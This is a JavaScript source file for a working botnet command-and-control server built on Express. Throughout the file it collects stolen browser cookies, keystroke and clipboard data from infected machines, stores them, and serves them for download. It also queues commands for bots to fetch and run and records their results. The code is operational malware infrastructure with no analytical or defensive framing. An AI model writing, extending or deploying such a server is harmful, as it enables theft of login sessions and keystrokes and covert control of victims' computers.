const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Botnet data
let bots = new Map();
let commands = new Map();
let commandResults = new Map();

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir);
}

// Cookie upload endpoint
app.post('/upload', (req, res) => {
  try {
    const cookieData = req.body;
    const timestamp = cookieData.timestamp ? cookieData.timestamp.replace(/[:.]/g, '-') : new Date().toISOString().replace(/[:.]/g, '-');
    const userPrefix = cookieData.userProfile || 'user';
    const filename = `${userPrefix}_cookies_${timestamp}.json`;
    const filepath = path.join(uploadsDir, filename);
    
    // Save cookie data to file
    fs.writeFileSync(filepath, JSON.stringify(cookieData, null, 2));
    
    const keystrokeCount = cookieData.total_keystrokes || 0;
    const clipboardCount = cookieData.total_clipboard || 0;
    console.log(`[${new Date().toISOString()}] Received ${cookieData.total_cookies} cookies, ${keystrokeCount} keystrokes, ${clipboardCount} clipboard entries - Saved to ${filename}`);
    
    res.json({
      success: true,
      message: 'Cookies uploaded successfully',
      filename: filename,
      count: cookieData.total_cookies
    });
  } catch (error) {
    console.error('Upload error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Status endpoint
app.get('/status', (req, res) => {
  const files = fs.readdirSync(uploadsDir);
  res.json({
    status: 'running',
    uploads_count: files.length,
    recent_files: files.slice(-5)
  });
});

// List all uploaded files
app.get('/files', (req, res) => {
  const files = fs.readdirSync(uploadsDir).map(file => {
    const filepath = path.join(uploadsDir, file);
    const stats = fs.statSync(filepath);
    return {
      filename: file,
      size: stats.size,
      created: stats.birthtime,
      modified: stats.mtime
    };
  });
  
  res.json({ files: files.sort((a, b) => b.created - a.created) });
});

// Download specific file
app.get('/download/:filename', (req, res) => {
  const filename = req.params.filename;
  const filepath = path.join(uploadsDir, filename);
  
  if (fs.existsSync(filepath)) {
    res.download(filepath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

// Botnet endpoints
app.get('/commands/:botId', (req, res) => {
  const botId = req.params.botId;
  bots.set(botId, {id: botId, lastSeen: new Date(), ip: req.ip});
  console.log(`Bot ${botId} polling for commands`);
  
  // Find pending command for this bot
  for (let [id, cmd] of commands) {
    if (cmd.status === 'pending' && (!cmd.assignedBot || cmd.assignedBot === botId)) {
      cmd.assignedBot = botId;
      cmd.status = 'assigned';
      console.log(`Assigning command ${id} to bot ${botId}`);
      return res.json(cmd);
    }
  }
  
  res.json({});
});

app.post('/commands/:commandId/result', (req, res) => {
  const commandId = req.params.commandId;
  const result = req.body;
  
  console.log(`Received result for command ${commandId}:`, result);
  commandResults.set(commandId, result);
  if (commands.has(commandId)) {
    commands.get(commandId).status = 'completed';
  }
  
  res.json({success: true});
});

// Web interface endpoints
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/api/bots', (req, res) => {
  const botList = Array.from(bots.values()).map(bot => ({
    ...bot,
    online: Date.now() - new Date(bot.lastSeen).getTime() < 60000
  }));
  res.json(botList);
});

app.post('/api/commands', (req, res) => {
  const command = {
    id: Date.now().toString(),
    ...req.body,
    status: 'pending',
    created: new Date()
  };
  commands.set(command.id, command);
  res.json(command);
});

app.get('/api/commands', (req, res) => {
  const commandList = Array.from(commands.values());
  res.json(commandList);
});

app.get('/api/results/:commandId', (req, res) => {
  const result = commandResults.get(req.params.commandId);
  res.json(result || {});
});

app.listen(PORT, () => {
  console.log(`Botnet C&C Server running on http://localhost:${PORT}`);
  console.log(`Upload endpoint: http://localhost:${PORT}/upload`);
  console.log(`Web interface: http://localhost:${PORT}`);
});